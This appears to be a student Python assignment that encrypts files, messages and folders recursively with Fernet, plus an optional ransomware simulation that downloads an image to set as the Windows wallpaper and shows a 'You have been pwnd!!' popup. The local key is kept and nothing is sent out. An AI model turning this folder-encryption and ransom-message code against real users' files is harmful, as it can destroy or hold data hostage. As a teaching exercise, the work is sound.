# !/usr/bin/env python3
#
# script name:  File_Encryption_03
# author:       ben_podawiltz
# revision:     7.19.21
#
######################################
#
# Purpose:
# Part 1
# Create a script that utilizes the cryptography library to:
# 1. Encrypt a file (mode 1)
# 2. Decrypt a file (mode 2)
# 3. Encrypt a message (mode 3)
# 4. Decrypt a message (mode 4)
# If mode 1 or 2 are selected, prompt the user to provide a filepath to a target file.
# If mode 3 or 4 are selected, prompt the user to provide a cleartext string.
#
# You’ll need to create four functions:
# 1. Encrypt the target file if in mode 1.
# 2. Delete the existing target file and replace it entirely with the encrypted version.
# 3. Decrypt the target file if in mode 2.
# 4. Delete the encrypted target file and replace it entirely with the encrypted version.
# 5. Encrypt the string if in mode 3.
# 6. Print the ciphertext to the screen.
# 7. Decrypt the string if in mode 4.
# 8. Print the cleartext to the screen.
#
# Part 2
# Add to the script:
# 1. Recursively encrypt a single folder and all its contents.
# 2. Recursively decrypt a single folder that was encrypted by this tool.
#
# Part 3
# 1. Alter the desktop wallpaper on a windows PC with a ransomeware message
# 2. Create a popup window on a windows PC with a ransomeware message
# ~ Make this feature optional. In the user menu prompt, add this as a ransomware simulation option.
######################################
#
# Libraries:

from email import message
from cryptography.fernet import Fernet
import os
import ctypes
import urllib.request
from tkinter import messagebox as mb


# Global variables:
victim = os.path.expanduser('~')
desk_path = f'{victim}\OneDrive\Desktop'
test_dir = f'{victim}\OneDrive\Desktop\Encryptfolder'


# Functions:


def main_menu():
    print("[1.] Encrypt a file")
    print("[2.] Decrypt a file")
    print("[3.] Encrypt a message")
    print("[4.] Decrypt a message")
    print("[5.] Encrypt a folder and its contents")
    print("[6.] Decryt a folder and its contents")
    print("[7.] Alter the desktop wallpaper on Windows PC with ransomeware message")
    print("[8.] Popup window with ransomeware message")
    print("[9.] Quit")
    user_input = input(
        "Welcome to the encryption script please select method above:")

    if user_input == "1":
        e_datapath()
    elif user_input == "2":
        d_datapath()
    elif user_input == "3":
        e_message()
    elif user_input == "4":
        d_message()
    elif user_input == "5":
        e_folder()
    elif user_input == "6":
        d_folder()
    elif user_input == "7":
        desk_paper()
    elif user_input == "8":
        pop_win()
    elif user_input == "9":
        exit
    else:
        print("Error, make another selection")


#######################################
#
# write and load key functions for encryption processes:


def save_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def load_key():
    return open("key.key", "rb").read()


# code borrowed from https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python #
save_key()
key = load_key()
fclass = Fernet(key)


def e_datapath():
    print("Please provide path-to-file for target encryption:")
    e_path = input("Target file for encryption:")
    # opens, reads contents of file then writes encrypted file to it
    with open(e_path, "rb") as e_file:
        myfiledata = e_file.read()
    encrypted_data = fclass.encrypt(myfiledata)
    with open(e_path, "wb") as enc_file:
        enc_file.write(encrypted_data)
    enc_file.close()
    print("**********File is Encrypted**********")
    print("")
    main_menu()


def d_datapath():
    print("Please provide path-to-file for target decryption:")
    d_path = input("Target file for decryption:")
    # opens, reads encrypted data in file then decrypts and writes to file
    with open(d_path, "rb") as d_file:
        enc_datafile = d_file.read()
        decrypted_data = fclass.decrypt(enc_datafile)

    with open(d_path, "wb") as dec_file:
        dec_file.write(decrypted_data)
    dec_file.close()
    print("*********File is Decrypted***********")
    print("")
    main_menu()


def e_message():
    msg_input = input("Input Message for encryption:")
    # encodes input message then prints to stndout
    enc_str = msg_input.encode()
    encrypted = fclass.encrypt(enc_str)
    print("*****Message is Encrypted*************")
    print(encrypted)
    main_menu()


def d_message():
    msg_input = input("Input String for decryption:")
    # decrypts ciphertext and prints cleartext to stndout
    d_str = str.encode(msg_input)
    decrypted = fclass.decrypt(d_str)
    print("***********Message is Decrypted**********")
    print(decrypted)
    main_menu()


def e_folder():
    user_dir = input("Enter path-to-folder for encryption:")
    for root, dirs, files in os.walk(user_dir):
        for file in files:
            filename = os.path.join(root, file)
            print(filename)
            with open(filename, 'rb') as og_file:
                og = og_file.read()
                encrypted = fclass.encrypt(og)
            with open(filename, 'wb') as e_file:
                e_file.write(encrypted)
                print(filename, "was encrypted")
    print("\n********Folder Encrypted***********")
    main_menu()


def d_folder():
    user_dir = input("Enter path-to-folder for decryption:")
    for root, dirs, files in os.walk(user_dir):
        for file in files:
            print(os.path.join(root, file))
            filename = os.path.join(root, file)
            with open(filename, 'rb') as og_file:
                og = og_file.read()
                decrypted = fclass.decrypt(og)
            with open(filename, 'wb') as d_file:
                d_file.write(decrypted)
                print(filename, "was encrypted")
                d_file.close()
    print('\n**********Folder Decrypted****************')
    main_menu()


def desk_paper():
    imageUrl = 'https://pronto-core-cdn.prontomarketing.com/2/wp-content/uploads/sites/2254/2020/01/Ransomware-Attack.png'
    # Go to specif url and download+save image using absolute path
    path = f'{desk_path}ransome_pic.jpg'
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    # Access windows dlls for funcionality eg, changing dekstop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 0, path, 0)
    main_menu()


def pop_win():
    mb.showinfo(title="There is no data only Zuel!!",
                message="You have been pwnd!!")
    # mb.showwarning("Your data is now enrypted. Click Ok to continue!",

    # mb.showwarning('Asks OK or Cancel')  # returns "OK" or "Cancel"
    main_menu()


# Method signatures:
#   alert(text='', title='', button='OK')
#   confirm(text='', title='', buttons=['OK', 'Cancel'])
#   prompt(text='', title='' , default='')
#   password(text='', title='', default='', mask='*')
#########################################################
# Call functions:
main_menu()


##########################################################

# Sources: https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
# https://www.geeksforgeeks.org/how-to-encrypt-and-decrypt-strings-in-python/
# https://stackoverflow.com/questions/28583565/str-object-has-no-attribute-decode-python-3-error
# https://medium.com/@abhishake21/encrypt-and-decrypt-files-and-folder-with-a-password-and-salt-of-your-choice-using-python-7101840b2753
# https://docs.python.org/3/faq/windows.html
# https://pyautogui.readthedocs.io/en/latest/
# End
